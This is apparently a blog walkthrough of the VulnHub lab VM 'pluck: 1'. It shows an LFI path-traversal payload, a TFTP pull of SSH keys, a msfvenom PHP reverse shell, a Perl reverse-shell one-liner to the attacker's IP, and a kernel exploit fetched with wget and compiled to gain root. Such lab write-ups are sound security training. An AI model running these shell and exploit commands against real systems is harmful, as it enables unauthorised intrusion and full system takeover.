@@ -1,0 +1,419 @@
+---
+layout: post
+title: "pluck: 1"
+date: 2019-05-21 17:37:39 +0000
+author: Larry Brown
+category: Walkthroughs
+tags: [vulnhub, lfi, tftp, pdmenu, kernel exploit]
+---
+<div>VulnHub URL: <a href="https://www.vulnhub.com/entry/pluck-1,178/" target="_blank">https://www.vulnhub.com/entry/pluck-1,178/</a></div>
+<div>Hostname: pluck</div>
+<div>IP Address: 10.183.0.217</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Information Gathering/Recon</h2>
+</div>
+<div><br /></div>
+<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.217.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Service Enumeration/Scanning</h2>
+</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pluck# nmap -Pn -sT -sV -A --script=default,banner -oA pluck -p- 10.183.0.217</div>
+    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-20 15:44 CDT</div>
+    <div>Nmap scan report for pluck.homenet.dom (10.183.0.217)</div>
+    <div>Host is up (0.0027s latency).</div>
+    <div>Not shown: 65531 closed ports</div>
+    <div>PORT     STATE SERVICE VERSION</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)</font>
+    </div>
+    <div>|_banner: SSH-2.0-<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">OpenSSH_7.3p1</font> Ubuntu-1</div>
+    <div>| ssh-hostkey: </div>
+    <div>|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)</div>
+    <div>|   256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)</div>
+    <div>|_  256 18:98:5a:5a:5c:59:e1:25:70:1c:37:1a:f2:c7:26:fe (ED25519)</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</font>
+    </div>
+    <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.18</font> (Ubuntu)</div>
+    <div>|_http-title: Pluck</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">3306/tcp open  mysql   MySQL (unauthorized)</font>
+    </div>
+    <div>| banner: I\x00\x00\x00\xFFj\x04Host 'kali.homenet.dom' is not allowed to</div>
+    <div>|_ connect to this MySQL server</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">5355/tcp open  llmnr?</font>
+    </div>
+    <div>MAC Address: 08:00:27:45:29:54 (Oracle VirtualBox virtual NIC)</div>
+    <div>Device type: general purpose</div>
+    <div>Running: Linux 3.X|4.X</div>
+    <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
+    <div>OS details: Linux 3.2 - 4.9</div>
+    <div>Network Distance: 1 hop</div>
+    <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>TRACEROUTE</div>
+    <div>HOP RTT     ADDRESS</div>
+    <div>1   2.65 ms pluck.homenet.dom (10.183.0.217)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
+    <div>Nmap done: 1 IP address (1 host up) scanned in 151.12 seconds</div>
+</div>
+<div><br /></div>
+<!--more-->
+<div><br /></div>
+<div>
+    <h2>Gaining Access</h2>
+</div>
+<div><br /></div>
+<div>Checking on the software detected by nmap, we have the following:</div>
+<ul>
+    <li>
+        <div>OpenSSH_7.3p1 - common username enumeration issues</div>
+    </li>
+    <li>
+        <div>Apache/2.4.18 - nothing applicable</div>
+    </li>
+    <li>
+        <div>MySQL? - unknown</div>
+    </li>
+</ul>
+<div><br /></div>
+<div>We don't have much to work with here, so we'll just start looking into the HTTP service on TCP port 80.</div>
+<div><br /></div>
+<div>The default site for the service is a fancy bootstrap page with helpful links.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>            &lt;ul class="nav navbar-nav"&gt;</div>
+    <div>                &lt;li&gt;&lt;a href="/"&gt;Home&lt;/a&gt;&lt;/li&gt;</div>
+    <div>                &lt;li&gt;&lt;a href="index.php?page=about.php"&gt;About&lt;/a&gt;&lt;/li&gt;</div>
+    <div>                &lt;li&gt;&lt;a href="index.php?page=contact.php"&gt;Contact Us&lt;/a&gt;&lt;/li&gt;</div>
+    <div>                &lt;li&gt;&lt;a href="admin.php"&gt;Admin&lt;/a&gt;&lt;/li&gt;   </div>
+    <div>            &lt;/ul&gt;</div>
+</div>
+<div><br /></div>
+<div>The style of the links immediately makes me think they might be vulnerable to local file inclusion (LFI). Trying <a href="http://10.183.0.217/index.php?page=../../../../../etc/passwd">http://10.183.0.217/index.php?page=../../../../../etc/passwd</a> results in the following.</div>
+<div><br /></div>
+<div><img height="1168" src="/assets/images/2019-05-21-pluck-1/3BC18138-EE19-46CF-BB3A-142BADB67367.png" width="2362" /><br /></div>
+<div><br /></div>
+<div>Some of the interesting accounts include...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root:x:0:0:root:/root:/bin/bash</div>
+    <div>bob:x:1000:1000:bob,,,:/home/bob:/bin/bash</div>
+    <div>peter:x:1001:1001:,,,:/home/peter:/bin/bash</div>
+    <div>paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu</div>
+    <div>backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh</div>
+</div>
+<div><br /></div>
+<div>Using our LFI exploit, we can check out the backup script /usr/local/scripts/backup.sh.</div>
+<div><br /></div>
+<div><a href="http://10.183.0.217/index.php?page=/usr/local/scripts/backup.sh">http://10.183.0.217/index.php?page=/usr/local/scripts/backup.sh</a></div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>[...snip...]</div>
+    <div>#!/bin/bash </div>
+    <div><br /></div>
+    <div>######################## </div>
+    <div># Server Backup script # </div>
+    <div>######################## </div>
+    <div><br /></div>
+    <div>#Backup directories in /backups so we can get it via tftp </div>
+    <div><br /></div>
+    <div>echo "Backing up data" </div>
+    <div>tar -cf /backups/backup.tar /home /var/www/html &gt; /dev/null 2&amp; &gt; /dev/null </div>
+    <div>echo "Backup complete"</div>
+    <div>[...snip...]</div>
+</div>
+<div><br /></div>
+<div>Lots of interesting information here. We can see that the /home and /var/www/html directories are being backed up to /backups/backup.tar. We also have mention of a tftp server.</div>
+<div><br /></div>
+<div>Let's see if we can download the backup file using tftp.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pluck# tftp 10.183.0.217</div>
+    <div>tftp&gt; verbose</div>
+    <div>Verbose mode on.</div>
+    <div>tftp&gt; get backup.tar</div>
+    <div>getting from 10.183.0.217:backup.tar to backup.tar [netascii]</div>
+    <div>Received 1824718 bytes in 8.6 seconds [1697412 bits/sec]</div>
+</div>
+<div><br /></div>
+<div>Extracting and browsing through the backup, we see a few interesting files. There is a '.sudo_as_admin_successful' file in bob's home directory, so he'd be a good account to target. The /var/www/html directory is incomplete (it doesn't contain the contact.php page) and the admin.php doesn't actually do anything. The most promising folder, though, is in paul's directory.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pluck/tmp/home/paul/keys# ls -l</div>
+    <div>total 48</div>
+    <div>-rwxrwxr-x 1 1002 1002  668 Jan 18  2017 id_key1</div>
+    <div>-rwxrwxr-x 1 1002 1002  600 Jan 18  2017 id_key1.pub</div>
+    <div>-rwxrwxr-x 1 1002 1002  672 Jan 18  2017 id_key2</div>
+    <div>-rwxrwxr-x 1 1002 1002  600 Jan 18  2017 id_key2.pub</div>
+    <div>-rwxrwxr-x 1 1002 1002  668 Jan 18  2017 id_key3</div>
+    <div>-rwxrwxr-x 1 1002 1002  600 Jan 18  2017 id_key3.pub</div>
+    <div>-rwxrwxr-x 1 1002 1002 1679 Jan 18  2017 id_key4</div>
+    <div>-rwxrwxr-x 1 1002 1002  392 Jan 18  2017 id_key4.pub</div>
+    <div>-rwxrwxr-x 1 1002 1002  668 Jan 18  2017 id_key5</div>
+    <div>-rwxrwxr-x 1 1002 1002  600 Jan 18  2017 id_key5.pub</div>
+    <div>-rwxrwxr-x 1 1002 1002 1675 Jan 18  2017 id_key6</div>
+    <div>-rwxrwxr-x 1 1002 1002  392 Jan 18  2017 id_key6.pub</div>
+</div>
+<div><br /></div>
+<div>Looks like paul has a bunch of SSH key pairs available. Time to start trying them out.</div>
+<div><br /></div>
+<div>We were able to SSH to the server using paul's id_key4 file. As we saw when we pulled /etc/passwd, paul's default shell is /usr/bin/pdmenu. This is pretty limited, but it will at least allow us to create files that we can then request with our LFI vulnerability.</div>
+<div><br /></div>
+<div>We'll start by creating our PHP reverse shell code using msfvenom, then serve it up with python's SimpleHTTPServer.</div>
+<div><br /></div>
+<div class="note"><b>NOTE:</b> I modified the rev64.php file to wrap the eval statement in &lt;?php ?&gt; tags.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pluck# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5433 -e php/base64 -f raw &gt; rev64.php</div>
+    <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
+    <div>[-] No arch selected, selecting arch: php from the payload</div>
+    <div>Found 1 compatible encoders</div>
+    <div>Attempting to encode payload with 1 iterations of php/base64</div>
+    <div>php/base64 succeeded with size 4050 (iteration=0)</div>
+    <div>php/base64 chosen with final size 4050</div>
+    <div>Payload size: 4050 bytes</div>
+    <div>root@kali:~/Walkthroughs/pluck# python -m SimpleHTTPServer 4321                                                                                       Serving HTTP on 0.0.0.0 port 4321 ...                                                                                                                 10.183.0.217 - - [20/May/2019 23:54:17] "GET /rev64.php HTTP/1.0" 200 -</div>
+</div>
+<div><br /></div>
+<div>Using pdmenu on the victim, we we can download the PHP file using the WWW option...</div>
+<div><br /></div>
+<div><img height="221" src="/assets/images/2019-05-21-pluck-1/9F628BFC-093E-426D-8328-4A400193742E.png" width="599" /><br /></div>
+<div><br /></div>
+<div>...then choosing to Download the file and Save to disk...</div>
+<div><br /></div>
+<div><img height="156" src="/assets/images/2019-05-21-pluck-1/6BFB71AF-A7E0-4C18-82FB-7D3419A3C21B.png" width="661" /><br /></div>
+<div><br /></div>
+<div>This saves our PHP reverse shell file in paul's home folder. Now we just need to start our listener in Metasploit and then request the file using our LFI vulnerability.</div>
+<div><br /></div>
+<div>I like to start two listeners since PHP reverse shells are usually pretty short-lived. Once I'm connected, I typically start a second reverse shell (usually using perl).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+    <div>payload =&gt; generic/shell_reverse_tcp</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div>
+    <div>LPORT =&gt; 5433</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 0.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5433 </div>
+    <div>msf5 exploit(multi/handler) &gt; </div>
+    <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+    <div>payload =&gt; generic/shell_reverse_tcp</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5434</div>
+    <div>LPORT =&gt; 5434</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 1.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5434</div>
+</div>
+<div><br /></div>
+<div>Requesting the reverse shell file in paul's home folder...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pluck# curl "http://10.183.0.217/index.php?page=/home/paul/rev64.php"</div>
+</div>
+<div><br /></div>
+<div>...results in my reverse shell in Metasploit...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5433 -&gt; 10.183.0.217:56388) at 2019-05-21 00:06:55 -0500</div>
+    <div>
+        <div><br /></div>
+        <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
+    </div>
+    <div>[*] Starting interaction with 1...</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>id</div>
+    <div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+    <div>perl -e 'use Socket;$i="10.183.0.222";$p=5434;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};' &amp;</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Command shell session 2 opened (10.183.0.222:5434 -&gt; 10.183.0.217:42724) at 2019-05-21 00:07:09 -0500</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>background</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Background session 1? [y/N]  y</div>
+    <div>msf5 exploit(multi/handler) &gt; sessions 2</div>
+    <div>[*] Starting interaction with 2...</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>www-data@pluck:/var/www/html$ </div>
+</div>
+<div><br /></div>
+<div>...and I went ahead and started my second reverse shell using perl.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Maintaining Access</h2>
+</div>
+<div><br /></div>
+<div>Was getting late, so I skipped this step this time.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Privilege Escalation</h2>
+</div>
+<div><br /></div>
+<div>Checking the installed kernel and operating system...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@pluck:/$ uname -a</div>
+    <div>Linux pluck 4.8.0-22-generic #24-Ubuntu SMP Sat Oct 8 09:15:00 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</div>
+    <div>www-data@pluck:/$ cat /etc/os*</div>
+    <div>NAME="Ubuntu"</div>
+    <div>VERSION="16.10 (Yakkety Yak)"</div>
+    <div>ID=ubuntu</div>
+    <div>ID_LIKE=debian</div>
+    <div>PRETTY_NAME="Ubuntu 16.10"</div>
+    <div>VERSION_ID="16.10"</div>
+    <div>HOME_URL="http://www.ubuntu.com/"</div>
+    <div>SUPPORT_URL="http://help.ubuntu.com/"</div>
+    <div>BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"</div>
+    <div>PRIVACY_POLICY_URL="http://www.ubuntu.com/legal/terms-and-policies/privacy-policy"</div>
+    <div>VERSION_CODENAME=yakkety</div>
+    <div>UBUNTU_CODENAME=yakkety</div>
+</div>
+<div><br /></div>
+<div>Looking through the possible known exploits, only one stands out.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                | exploits/linux/local/45010.c</div>
+</div>
+<div><br /></div>
+<div>Reading through the writeup, the exploit has worked on several kernels and operating systems, though not ours specifically. Still, it is the closest thing we see, so we'll give it a try.</div>
+<div><br /></div>
+<div>I copied the exploit to my working directory and served it up with python's SimpleHTTPServer. Then, on the victim...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@pluck:/boot$ cd /tmp</div>
+    <div>www-data@pluck:/tmp$ wget -O 45010.c 10.183.0.222:4321/45010.c</div>
+    <div>--2019-05-21 07:14:47--  http://10.183.0.222:4321/45010.c</div>
+    <div>Connecting to 10.183.0.222:4321... connected.</div>
+    <div>HTTP request sent, awaiting response... 200 OK</div>
+    <div>Length: 13728 (13K) [text/plain]</div>
+    <div>Saving to: '45010.c'</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>     0K .......... ...                                        100% 16.2M=0.001s</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>2019-05-21 07:14:47 (16.2 MB/s) - '45010.c' saved [13728/13728]</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>www-data@pluck:/tmp$ gcc -o pwn 45010.c</div>
+    <div>www-data@pluck:/tmp$ ./pwn</div>
+    <div>id</div>
+    <div>uid=0(root) gid=0(root) groups=0(root),33(www-data)</div>
+</div>
+<div><br /></div>
+<div>It worked! We have root. Let's get the flag.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>cd /root</div>
+    <div>cat flag.txt</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Congratulations you found the flag</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>---------------------------------------</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>######   ((((((((((((((((((((((((((((((</div>
+    <div>#########   (((((((((((((((((((((((((((</div>
+    <div>,,##########   ((((((((((((((((((((((((</div>
+    <div>@@,,,##########   (((((((((((((((((((((</div>
+    <div>@@@@@,,,##########                     </div>
+    <div>@@@@@@@@,,,############################</div>
+    <div>@@@@@@@@@@@,,,#########################</div>
+    <div>@@@@@@@@@,,,###########################</div>
+    <div>@@@@@@,,,##########                    </div>
+    <div>@@@,,,##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</div>
+    <div>,,,##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</div>
+    <div>##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</div>
+    <div>#######   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</div>
+    <div>
+        <div><br /></div>
+    </div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Pivoting</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div>
+    <h2>Clean Up</h2>
+</div>
+<div><br /></div>
+<div>*** REMOVE /home/paul/rev64.php ***</div>
+<div>*** REMOVE /tmp/pwn ***</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Additional Info</h2>
+</div>
+<div><br /></div>
+<div><span style="font-weight: bold;">/etc/xinetd.d/tftp</span></div>
+<div><br /></div>
+<div>Looking further at the TFTP service, we aren't able to write ("put") to the /backups directory. Checking the TFTP service configuration using the LFI vulnerability, we see the following in the /etc/xinetd.d/tftp file.</div>
+<div><br /></div>
+<div><a href="http://10.183.0.217/index.php?page=/etc/xinetd.d/tftp">http://10.183.0.217/index.php?page=/etc/xinetd.d/tftp</a></div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>[...snip...]</div>
+    <div>service tftp </div>
+    <div>{ </div>
+    <div>protocol = udp </div>
+    <div>port = 69 </div>
+    <div>socket_type = dgram </div>
+    <div>wait = yes </div>
+    <div>user = nobody </div>
+    <div>server = /usr/sbin/in.tftpd </div>
+    <div>server_args = /backups </div>
+    <div>disable = no </div>
+    <div>}</div>
+    <div>[...snip...]</div>
+</div>
+<div><br /></div>
+<div><br /></div>
